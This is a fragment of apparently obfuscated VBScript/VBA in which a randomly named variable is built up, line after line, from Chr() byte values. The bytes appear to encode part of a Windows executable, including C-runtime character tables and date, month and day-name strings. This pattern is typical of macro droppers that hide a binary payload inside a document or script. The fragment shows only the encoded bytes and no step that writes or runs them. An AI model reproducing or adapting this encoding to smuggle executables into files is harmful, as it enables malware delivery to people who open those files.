GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)
GqnqCn=GqnqCn&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(72)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)
GqnqCn=GqnqCn&Chr(129)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)
GqnqCn=GqnqCn&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(104)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)
GqnqCn=GqnqCn&Chr(40)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(72)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)
GqnqCn=GqnqCn&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)
GqnqCn=GqnqCn&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(72)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)
GqnqCn=GqnqCn&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(20)&Chr(0)&Chr(20)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(20)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)
GqnqCn=GqnqCn&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(16)&Chr(0)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(16)&Chr(0)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)
GqnqCn=GqnqCn&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)
GqnqCn=GqnqCn&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(0)&Chr(1)&Chr(2)&Chr(3)&Chr(4)&Chr(5)&Chr(6)&Chr(7)&Chr(8)&Chr(9)&Chr(10)&Chr(11)&Chr(12)&Chr(13)&Chr(14)&Chr(15)&Chr(16)&Chr(17)&Chr(18)&Chr(19)&Chr(20)&Chr(21)&Chr(22)&Chr(23)&Chr(24)&Chr(25)&Chr(26)&Chr(27)&Chr(28)&Chr(29)&Chr(30)&Chr(31)&Chr(32)&Chr(33)&Chr(34)&Chr(35)&Chr(36)&Chr(37)&Chr(38)&Chr(39)&Chr(40)&Chr(41)&Chr(42)&Chr(43)&Chr(44)&Chr(45)&Chr(46)&Chr(47)&Chr(48)&Chr(49)&Chr(50)&Chr(51)&Chr(52)&Chr(53)&Chr(54)&Chr(55)&Chr(56)&Chr(57)&Chr(58)&Chr(59)&Chr(60)&Chr(61)&Chr(62)&Chr(63)&Chr(64)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)
GqnqCn=GqnqCn&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(91)&Chr(92)&Chr(93)&Chr(94)&Chr(95)&Chr(96)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(123)&Chr(124)&Chr(125)&Chr(126)&Chr(127)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)
GqnqCn=GqnqCn&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)
GqnqCn=GqnqCn&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)
GqnqCn=GqnqCn&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(0)&Chr(1)&Chr(2)&Chr(3)&Chr(4)&Chr(5)&Chr(6)&Chr(7)&Chr(8)&Chr(9)&Chr(10)&Chr(11)&Chr(12)&Chr(13)&Chr(14)&Chr(15)&Chr(16)&Chr(17)&Chr(18)&Chr(19)&Chr(20)&Chr(21)&Chr(22)&Chr(23)&Chr(24)&Chr(25)&Chr(26)&Chr(27)&Chr(28)&Chr(29)&Chr(30)&Chr(31)&Chr(32)&Chr(33)&Chr(34)&Chr(35)&Chr(36)&Chr(37)&Chr(38)&Chr(39)&Chr(40)&Chr(41)&Chr(42)&Chr(43)&Chr(44)&Chr(45)&Chr(46)&Chr(47)&Chr(48)&Chr(49)&Chr(50)&Chr(51)&Chr(52)&Chr(53)&Chr(54)&Chr(55)&Chr(56)&Chr(57)&Chr(58)&Chr(59)&Chr(60)&Chr(61)&Chr(62)&Chr(63)&Chr(64)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(91)&Chr(92)&Chr(93)&Chr(94)&Chr(95)
GqnqCn=GqnqCn&Chr(96)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(123)&Chr(124)&Chr(125)&Chr(126)&Chr(127)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)
GqnqCn=GqnqCn&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(72)&Chr(72)&Chr(58)&Chr(109)&Chr(109)&Chr(58)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(100)&Chr(100)&Chr(100)&Chr(44)&Chr(32)&Chr(77)&Chr(77)&Chr(77)&Chr(77)&Chr(32)&Chr(100)&Chr(100)&Chr(44)&Chr(32)&Chr(121)&Chr(121)&Chr(121)&Chr(121)&Chr(0)&Chr(77)&Chr(77)&Chr(47)&Chr(100)&Chr(100)&Chr(47)&Chr(121)&Chr(121)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(77)&Chr(0)&Chr(0)&Chr(65)&Chr(77)&Chr(0)&Chr(0)&Chr(68)&Chr(101)&Chr(99)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(78)&Chr(111)&Chr(118)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(79)&Chr(99)&Chr(116)&Chr(111)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(83)&Chr(101)&Chr(112)&Chr(116)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(117)&Chr(103)&Chr(117)&Chr(115)&Chr(116)&Chr(0)&Chr(0)&Chr(74)&Chr(117)&Chr(108)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(74)&Chr(117)&Chr(110)&Chr(101)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(112)&Chr(114)&Chr(105)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(77)&Chr(97)&Chr(114)&Chr(99)&Chr(104)&Chr(0)&Chr(0)&Chr(0)&Chr(70)&Chr(101)&Chr(98)&Chr(114)
GqnqCn=GqnqCn&Chr(117)&Chr(97)&Chr(114)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(74)&Chr(97)&Chr(110)&Chr(117)&Chr(97)&Chr(114)&Chr(121)&Chr(0)&Chr(68)&Chr(101)&Chr(99)&Chr(0)&Chr(78)&Chr(111)&Chr(118)&Chr(0)&Chr(79)&Chr(99)&Chr(116)&Chr(0)&Chr(83)&Chr(101)&Chr(112)&Chr(0)&Chr(65)&Chr(117)&Chr(103)&Chr(0)&Chr(74)&Chr(117)&Chr(108)&Chr(0)&Chr(74)&Chr(117)&Chr(110)&Chr(0)&Chr(77)&Chr(97)&Chr(121)&Chr(0)&Chr(65)&Chr(112)&Chr(114)&Chr(0)&Chr(77)&Chr(97)&Chr(114)&Chr(0)&Chr(70)&Chr(101)&Chr(98)&Chr(0)&Chr(74)&Chr(97)&Chr(110)&Chr(0)&Chr(83)&Chr(97)&Chr(116)&Chr(117)&Chr(114)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(70)&Chr(114)&Chr(105)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(84)&Chr(104)&Chr(117)&Chr(114)&Chr(115)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(101)&Chr(100)&Chr(110)
